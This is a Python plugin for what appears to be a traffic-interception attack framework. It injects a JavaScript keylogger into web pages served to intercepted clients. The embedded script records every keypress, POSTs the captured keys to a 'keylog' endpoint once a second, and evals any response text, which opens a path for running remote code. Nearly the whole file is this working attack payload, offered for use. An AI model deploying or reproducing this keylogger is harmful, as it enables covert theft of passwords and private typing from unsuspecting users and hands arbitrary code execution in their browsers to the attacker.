from plugins.plugin import Plugin
from plugins.Inject import Inject

class jskeylogger(Inject, Plugin):
    name = "Javascript Keylogger"
    optname = "jskeylogger"
    desc = "Injects a javascript keylogger into clients webpages"
    has_opts = False

    def initialize(self,options):
        Inject.initialize(self, options)
        self.html_payload = self.get_payload()
        print "[*] %s online" % self.name

    def get_payload(self):
        #simple js keylogger stolen from http://wiremask.eu/xss-keylogger/

        payload = """<script type="text/javascript">
var keys = '';

function make_xhr(){
    var xhr;
            try {
                xhr = new XMLHttpRequest();
            } catch(e) {
                try {
                    xhr = new ActiveXObject("Microsoft.XMLHTTP");
                } catch(e) {
                    xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
                }
            }
            if(!xhr) {
                throw "failed to create XMLHttpRequest";
            }
            return xhr;
        }
        
        xhr = make_xhr();
        xhr.onreadystatechange = function() {
            if(xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
                eval(xhr.responseText);
            }
        }

document.onkeypress = function(e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}

window.setInterval(function(){
    if (keys.length > 0){
        xhr.open("POST", "keylog", true);
        xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        xhr.send(keys);
        keys = '';
    }
}, 1000);
</script>"""

        return payload